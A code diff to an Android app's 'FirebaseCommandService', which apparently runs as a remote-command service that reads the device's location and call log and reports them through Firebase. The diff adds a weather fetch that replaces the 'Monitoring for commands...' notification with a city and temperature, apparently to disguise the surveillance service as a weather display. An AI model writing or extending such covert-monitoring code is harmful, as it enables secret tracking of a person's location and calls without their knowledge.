@@ -1,5 +1,12 @@
 package com.jonas.x24.services
 
+import retrofit2.Retrofit
+import retrofit2.converter.gson.GsonConverterFactory
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 import android.Manifest
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -18,7 +25,7 @@ import android.os.Build
 import android.os.IBinder
 import android.provider.CallLog
 import android.util.Log
-import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
@@ -30,6 +37,10 @@ import com.jonas.x24.services.x24AccessibilityService
 import com.jonas.x24.services.x24NotificationService
 
 class FirebaseCommandService : Service() {
+
+    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
+    private var weatherUpdateJob: Job? = null
+    private val WEATHER_UPDATE_INTERVAL = 30 * 60 * 1000L // 30 mins
 
     private lateinit var database: DatabaseReference
     private var sessionKey: String? = null
@@ -48,6 +59,7 @@ class FirebaseCommandService : Service() {
             setupFirebaseListener(key)
         }
 
+        startWeatherUpdates()
         startForeground(1001, createNotification())
         return START_STICKY
     }
@@ -112,8 +124,8 @@ class FirebaseCommandService : Service() {
     }
 
     private fun getLocation() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             postResult("ERROR", "Location permissions denied")
             return
         }
@@ -207,7 +219,7 @@ class FirebaseCommandService : Service() {
     }
 
     private fun getRecentCalls() {
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             postResult("ERROR", "READ_CALL_LOG permission not granted", "GET_RECENT_CALLS")
             return
         }
@@ -282,7 +294,7 @@ class FirebaseCommandService : Service() {
         postResult("TEXT", builder.toString().trim())
     }
 
-    private fun createNotification(): android.app.Notification {
+    private fun createNotification(title: String = "x24 Active", text: String = "Monitoring for commands..."): android.app.Notification {
         val channelId = "x24_monitor_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
@@ -295,8 +307,8 @@ class FirebaseCommandService : Service() {
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("x24 Active")
-            .setContentText("Monitoring for commands...")
+            .setContentTitle(title)
+            .setContentText(text)
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setOngoing(true)
             .build()
@@ -308,8 +320,64 @@ class FirebaseCommandService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        weatherUpdateJob?.cancel()
         if (listener != null && ::database.isInitialized) {
             database.removeEventListener(listener!!)
+        }
+    }
+
+    private fun startWeatherUpdates() {
+        weatherUpdateJob = serviceScope.launch {
+            while (true) {
+                updateWeatherNotification()
+                delay(WEATHER_UPDATE_INTERVAL)
+            }
+        }
+    }
+
+    private fun updateWeatherNotification() {
+        try {
+            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            var location: Location? = null
+
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+
+                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                if (location == null) {
+                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                }
+            }
+
+            if (location != null) {
+                val geocoder = Geocoder(this, java.util.Locale.getDefault())
+                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
+                val city = addresses?.firstOrNull()?.locality ?: "Unknown City"
+
+                val retrofit = Retrofit.Builder()
+                    .baseUrl("https://api.open-meteo.com/")
+                    .addConverterFactory(GsonConverterFactory.create())
+                    .build()
+
+                val api = retrofit.create(WeatherApi::class.java)
+                val response = api.getCurrentWeather(location.latitude, location.longitude).execute()
+
+                if (response.isSuccessful) {
+                    val weather = response.body()?.current_weather
+                    if (weather != null) {
+                        val temp = weather.temperature
+                        val title = "$city"
+                        val text = "Temperature: $temp°C"
+
+                        val notification = createNotification(title, text)
+                        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                        notificationManager.notify(1001, notification)
+                        return
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("x24", "Failed to update weather: ${e.message}")
         }
     }
 }
